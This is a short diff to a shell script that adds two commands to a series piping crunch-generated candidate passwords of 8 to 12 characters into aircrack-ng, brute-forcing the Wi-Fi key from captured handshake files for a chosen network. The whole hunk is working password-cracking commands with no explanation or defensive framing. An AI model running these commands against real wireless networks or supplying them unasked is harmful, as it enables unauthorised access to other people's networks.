@@ -30,6 +30,8 @@ read B
 
 # Generating a password from 8 to 12 characters
 crunch 8 12 0123456789 | aircrack-ng -w - *.cap -b $B
+crunch 8 12 qwertyuiopasdfghjklzxcvbnm | aircrack-ng -w - *.cap -b $B
+crunch 8 12 QWERTYUIOPASDFGHJKLZXCVBNM | aircrack-ng -w - *.cap -b $B
 crunch 8 12 0123456789qwertyuiopasdfghjklzxcvbnm | aircrack-ng -w - *.cap -b $B
 crunch 8 12 0123456789QWERTYUIOPASDFGHJKLZXCVBNM\(\)\[\]\{\}\!\@\#\$ | aircrack-ng -w - *.cap -b $B
 crunch 8 12 qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM | aircrack-ng -w - *.cap -b $B
